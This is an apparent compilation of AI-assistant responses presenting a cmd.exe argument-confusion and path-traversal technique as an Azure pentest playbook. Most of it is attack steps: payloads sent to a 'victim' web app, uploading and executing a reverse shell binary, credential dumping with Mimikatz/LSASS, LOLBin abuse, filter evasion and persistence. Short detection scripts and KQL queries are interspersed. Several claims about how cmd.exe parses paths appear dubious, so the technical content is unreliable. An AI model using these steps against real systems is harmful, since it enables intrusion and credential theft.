# **Command Hijacking via Argument Confusion & Path Traversal in cmd.exe**

Exploit improperly sanitized command-line arguments in Windows systems
(including those in Azure VMs or App Services) to hijack execution
flow—ultimately achieving **remote code execution (RCE)**, **privilege
escalation**, or **lateral movement**.

**🧪 Vulnerability Concept: cmd.exe Argument Confusion with Path
Traversal**

This technique abuses a **confusion in argument handling** by cmd.exe
when invoked with the /c switch. It's **not a bug** in cmd.exe per se,
but a **logic flaw in how developers use it improperly**, especially in
PHP, Python, Node.js, or .NET applications that generate system commands
dynamically.

**Exploit Summary**

- cmd.exe /c "ping 127.0.0.1" → expected behavior

- Replace argument:\
  cmd.exe /c "ping
  127.0.0.1/../../../../../../../../../../Windows/System32/calc.exe"\
  → **launches calc.exe instead of ping.exe**

🧠 Why? Because cmd.exe interprets the full string as a command (not
just an argument), and fails to resolve ping as a known binary when path
traversal makes it a new executable path.

**🧵 How This Applies in Azure**

**Common Azure Targets:**

- Azure **Windows Virtual Machines** (especially
  legacy/line-of-business)

- Azure **Web Apps** or **Function Apps** running in Windows containers

- Vulnerable apps hosted in Azure using:

  - shell_exec() in PHP

  - subprocess.run() in Python

  - Process.Start() in C#

- Any app passing **user-controlled strings to cmd.exe /c without proper
  quoting**

**🛠️ Step-by-Step Exploitation in Azure**

**✅ Precondition:**

The application or script running on a Windows system hosted in Azure
must:

- Invoke cmd.exe with /c

- Include user input as part of the command

- Fail to wrap arguments in quotes properly

**🧪 Example Exploit Scenario:**

1.  **Target Command in Application:**

2.  \$ip = \$\_GET\['ip'\]; // user input

3.  \$cmd = "ping " . escapeshellcmd(\$ip);

4.  shell_exec("cmd.exe /c \\\$cmd\\");

    - Uses escapeshellcmd() — **but fails to quote the full argument**

    - Looks safe, but isn't!

5.  **Attacker Input:**

6.  127.0.0.1/../../../../../../../../../../windows/system32/calc.exe

7.  **Final Command Run by cmd.exe:**

8.  cmd.exe /c "ping
    127.0.0.1/../../../../../../../../../../windows/system32/calc.exe"

9.  **Result:**

    - calc.exe is executed instead of ping.exe

    - Any binary path can be hijacked and executed

    - **RCE achieved** depending on app permissions

**🔥 Pentester’s Playbook (Azure Context)**

| **Phase** | **Action** | **Tool/Command** | **Note** |
|----|----|----|----|
| 🧭 Recon | Identify apps calling cmd.exe with /c | az vm run-command, directory search, source audit | Focus on PHP, C#, Python apps |
| 🎯 Target | Determine unquoted input injection | Fuzz user input | Look for “ping”, “tracert”, “netstat” in code |
| 💥 Exploit | Use path traversal payload | /../../../../windows/system32/calc.exe | Replace tool name in command |
| 🔓 RCE | Execute payload on Azure VM | Use reverse shell binary path | Gain session or persist |
| 🚪 Post | Dump creds, escalate, lateral movement | Mimikatz, LSASS dump | Target AAD Connect / WinRM exposed boxes |

**💡 Defense in Azure**

| **Control** | **Mitigation** |
|----|----|
| 🔐 **Application Hardening** | Use escapeshellarg() or subprocess.run(\[...\], shell=False) |
| 📦 **Azure Defender for VMs** | Detect suspicious use of cmd.exe and execution of unexpected binaries |
| 🚪 **NSGs + JIT Access** | Restrict VM access to developers, disable webshells |
| 🛡️ **App Service Isolation** | Place vulnerable apps in App Service Environment (ASE) with NSG rules |
| 📣 **Sentinel Analytics** | Alert on unusual processes or path traversal in command-line args |

**🧠 Final Thoughts**

This technique isn’t a memory corruption bug — it's a **logic flaw**
based on misunderstanding how cmd.exe interprets inputs. In real-world
Azure pentests, it becomes highly valuable when:

- Web apps pass unsanitized input to Windows commands

- Security tools or admin scripts use lazy argument quoting

- Hybrid cloud environments expose older PHP or .NET apps

Would you like a **ready-to-use detection rule**, **PowerShell
scanner**, or a **PHP audit script** for spotting this in Azure apps?

Great! Below is a practical toolkit tailored for **Azure penetration
testing and blue team validation**, focused on detecting and exploiting
**cmd.exe command hijack via path traversal** in Windows-based Azure
environments.

**Part 1: PowerShell Detection Script**

This script scans directories (like IIS or app folders) for suspicious
cmd.exe /c usage, especially where arguments aren’t quoted
properly—often used in web shells or misconfigured scripts.

**✅ PowerShell – Scan for Unsafe cmd.exe /c Usage**

\# PowerShell script to detect potential vulnerable use of cmd.exe /c

\$searchPath = "C:\inetpub\wwwroot" \# Change as needed

\$pattern = 'cmd.exe\s\*/c\s\*".\*?(\s+\[^"\]\*\[/\\\]\\\\\[/\\\])+'

Get-ChildItem -Path \$searchPath -Recurse -Include
\*.ps1,\*.php,\*.js,\*.py,\*.config,\*.bat -ErrorAction SilentlyContinue
\|

ForEach-Object {

\$content = Get-Content \$\_.FullName -Raw -ErrorAction SilentlyContinue

if (\$content -match \$pattern) {

Write-Host "\`n\[!\] Possible vulnerable usage in \$(\$\_.FullName):"

(\$content -split "\`n") \| Where-Object { \$\_ -match 'cmd.exe\s\*/c' }
\| ForEach-Object { Write-Host " \$\_" }

}

}

**🧪 Part 2: PowerShell Exploitation Example**

If you're on a pentest and find a web app or service calling cmd.exe /c
"ping \$userInput", here's a test payload:

**🧨 Exploit Test (Open Calculator):**

\# Craft a path traversal payload to trigger calc.exe

\$payload =
"127.0.0.1/../../../../../../../../../../windows/system32/calc.exe"

Start-Process "cmd.exe" -ArgumentList "/c ping \$payload"

Replace calc.exe with your own payload or binary if aiming for shell
access.

**☁️ Part 3: Azure CLI - Find Suspect Files in Azure VMs**

Use this to search all your VMs for files containing unsafe usage of
cmd.exe (if you have Azure Run Command permissions):

**🔎 Search Azure VMs with Azure CLI + Run Command**

\# List VMs

az vm list -d --query "\[\].{name:name, resourceGroup:resourceGroup}" -o
tsv \| while read name rg; do

echo "\[\*\] Scanning \$name in \$rg"

az vm run-command invoke \\

--resource-group "\$rg" \\

--name "\$name" \\

--command-id RunPowerShellScript \\

--scripts @detect-cmd-injection.ps1

done

➡️ Save the PowerShell detection script from Part 1 as
detect-cmd-injection.ps1 before running this.

**🚀 Bonus: Auto-Gather cmd.exe Process Activity**

Use this to check for runtime abuse of cmd.exe in Azure VMs:

Get-WmiObject Win32_Process -Filter "Name='cmd.exe'" \|

Select-Object ProcessId, CommandLine, CreationDate \|

Sort-Object CreationDate -Descending

**🛡️ Blue Team: Sentinel / Defender for Endpoint Detection Idea**

**KQL Query Example for Microsoft Defender for Endpoint or Sentinel:**

DeviceProcessEvents

\| where FileName =~ "cmd.exe"

\| where ProcessCommandLine has "/c"

\| where ProcessCommandLine has "../../../../"

\| project Timestamp, DeviceName, InitiatingProcessAccountName,
ProcessCommandLine

Would you like a standalone **PowerShell scanner module**, a **reverse
shell payload generator**, or a **web shell validator** next?

Great — based on your goals, I’ll restructure the cmd.exe path traversal
(CMD Hijack) vulnerability into an actionable **Azure Pentest** format
using **PowerShell and Azure CLI**, and explain each step clearly.

**🔧 Attack Vector: CMD Hijack via Argument Path Traversal**

**Summary**

This attack exploits Windows' cmd.exe parsing behavior with improperly
sanitized inputs in web apps or services calling cmd.exe /c "\<user
input\>". If the input isn't quoted or validated, an attacker can force
cmd.exe to interpret the argument as a full path to a malicious
executable (e.g., calc.exe instead of ping).

**⛏️ Azure Pentesting Context**

- **Target**: Windows-based Azure VM or App Service using cmd.exe to
  spawn commands.

- **Vector**: Web app or API that executes commands from user input
  (e.g., ping, tracert) using cmd.exe /c.

- **Goal**: Exploit path traversal to achieve RCE or spawn reverse
  shell.

**🧪 Step-by-Step Exploitation Using PowerShell**

**Step 1: Confirm Command Injection Possibility**

Invoke-WebRequest -Uri
"http://victim.azurewebsites.net/api/ping?ip=127.0.0.1" -UseBasicParsing

If the response reflects ping results, it's likely the API spawns
cmd.exe /c "ping \<user_input\>".

**Step 2: Craft the Malicious Input**

You try to replace ping with an actual path to a binary (like calc.exe,
nc.exe, or reverse shell).

\# Windows system utility abuse via path traversal

\$payload =
"127.0.0.1/../../../../../../../../windows/system32/calc.exe"

Invoke-WebRequest -Uri
"http://victim.azurewebsites.net/api/ping?ip=\$payload" -UseBasicParsing

If successful, this will launch calc.exe (POC). Replace with reverse
shell binary for real RCE.

**Step 3: Upload Reverse Shell Binary to Azure VM (If You Have Write
Access)**

\# Upload using AzCopy or PowerShell

az storage blob upload --account-name mystorage --container-name
payloads --name shell.exe --file shell.exe

\# From VM shell

Invoke-WebRequest -Uri
"https://\<storage-account\>.blob.core.windows.net/payloads/shell.exe"
-OutFile "C:\Windows\Temp\shell.exe"

**Step 4: Execute Reverse Shell via Path Traversal**

\$payload = "127.0.0.1/../../../../../../../../windows/temp/shell.exe"

Invoke-WebRequest -Uri
"http://victim.azurewebsites.net/api/ping?ip=\$payload"

**Step 5: Hardened Detection (Blue Team Notes)**

You can use PowerShell to audit unsafe usage of cmd.exe /c:

Get-WinEvent -LogName "Security" \| Where-Object {

\$\_.Message -like "\*cmd.exe /c\*"

}

Or search via Defender logs in Azure:

\# Defender for Endpoint

DeviceProcessEvents

\| where FileName =~ "cmd.exe"

\| where ProcessCommandLine has "/c"

**📌 Mitigations for Defenders**

- Always use escapeshellarg() (not just escapeshellcmd()) in code.

- Enforce input sanitization and wrap parameters in quotes.

- Disallow direct use of user input in command-line contexts.

Would you like me to create a **PowerShell module** that scans for this
type of command injection and path traversal behavior in Azure-hosted
apps?

## Azure Post-Exploitation: CMD Argument Hijacking and LOLBin Abuse

Here’s a rewritten, corrected, and detailed summary tailored for an
**Azure penetration testing context**, focusing on how this technique
applies to cloud-hosted Windows systems (e.g., Azure VMs) and its
implications:

**Azure Post-Exploitation: CMD Argument Hijacking and LOLBin Abuse**

*A non-CVE “technique” that enables execution hijacking via cmd.exe /c
argument manipulation combined with path traversal.*

**Overview**

This technique leverages how cmd.exe processes arguments passed to it
via /c. The behavior allows for **Local File Inclusion (LFI)**-like
behavior and, with the right circumstances, **Remote Code Execution
(RCE)** via manipulation of relative paths and misuse of Windows LOLBins
(Living Off the Land Binaries).

**Use Case in Azure**

Once you have **code execution or a foothold in an Azure Windows VM**
(via RCE, credential theft, misconfigured Run Command, or other means),
this technique can help you:

- Evade basic detection

- Execute payloads using trusted binaries

- Pivot laterally within the VM or network

- Elevate privileges indirectly (if used in scheduled tasks, service
  configs, etc.)

**Step-by-Step Breakdown**

**🔹 1. Understanding CMD's Parsing Logic**

When using:

cmd.exe /c "ping
127.0.0.1/../../../../../../../windows/system32/calc.exe"

The cmd.exe interpreter attempts to treat the string as a **path**,
starting from the current working directory. It performs **path
normalization**, removing segments like ../, and will **resolve and
execute the resultant executable** (here: calc.exe).

❗ This behavior means **payload execution** can be disguised as part of
a command argument, without traditional methods like file uploads or
modifying registry.

**🔹 2. LOLBin Execution via Argument Hijack**

You can exploit binaries that:

- Accept multiple arguments

- Ignore malformed arguments

- Continue to execute even when provided a confusing command line

**Example**:

cmd.exe /c "ping
;calc.exe;127.0.0.1/../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe"

Even though cmd doesn’t treat ; as a separator like Bash, **PowerShell
does**. This means in specific contexts, you might trick PowerShell into
executing unintended commands.

**🔹 3. Hijack Execution Flow with Traversal**

You can manipulate commands like:

cmd.exe /c "ping 127.0.0.1/../calc.exe"

If the path is resolved successfully, Windows executes calc.exe from
C:\Windows\System32, effectively bypassing the intention of running
ping.

**🔹 4. LOLBin Hunting Criteria**

To make this useful in the wild or during post-exploitation:

- Find a **LOLBAS binary** that accepts multiple arguments

- The binary **must not crash** with malformed input

- Ideally, it **ignores first/last arguments** and still executes
  properly

Examples:

- ieexec.exe from the LOLBAS project

- mshta.exe, wscript.exe, forfiles.exe, etc.

This allows your payload to execute even if you can't fully control the
full argument string (as in environment variables, scheduled tasks, or
weak command injection filters).

**Azure CLI and PowerShell Usage Context**

**🔸 In Azure, this technique could be weaponized by:**

- **Abusing Run Command**: Send payloads like:

- az vm run-command invoke --resource-group MyRG --name WinVM
  --command-id RunPowerShellScript --scripts "cmd.exe /c 'ping
  127.0.0.1/../../../windows/system32/calc.exe'"

- **Modifying startup tasks or startup scripts** in Windows VMs where
  input is not properly validated.

**🔸 PowerShell Variants:**

\$cmd = 'cmd.exe /c "ping 127.0.0.1/../../../windows/system32/calc.exe"'

Invoke-Expression \$cmd

Or encoded payload:

\$payload = "calc.exe"

\$cmd = "cmd.exe /c ping
;\$payload;/../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe"

Invoke-Expression \$cmd

**Detection Avoidance in Azure**

Since many Azure VMs rely on Run Command or even Custom Script
Extensions, you may see this abused in:

- Obfuscated malware commands

- Scheduled tasks with malformed command lines

- Registry keys used to start legitimate scripts, but redirected via
  argument hijacking

**Red Team Use Cases in Azure**

- **Abuse in Lateral Movement**: Use schtasks, runas, or at to persist
  with camouflaged binaries

- **Evade Filtering**: Command injection filters often catch ;, &&, \|,
  but **path traversal + LOLBin** evades these

- **Persistence**: Use cmd.exe /c in service paths or task actions

**Key Lessons & Research Insights**

- cmd.exe does **pre-existence checks** using QueryDirectory, not
  CreateFile, making detection harder via classic API hooks.

- Executables with **spaces in path** are parsed carefully – if resolved
  to a file, no argument split occurs. Only unresolved paths trigger
  argument splitting.

- This technique resembles **unquoted service path** vulnerabilities in
  reverse – the **last resolved path wins**, not the first.

**✅ Conclusion**

This is **not a CVE**, but rather a **technique** with real-world
post-exploitation value in Azure environments. It shows how deeply
understanding command-line parsing in cmd.exe and LOLBin behavior can
enable stealthy and creative privilege escalation or persistence
methods.

Would you like me to convert this into a Markdown or HTML-formatted
cheat sheet for your playbook?
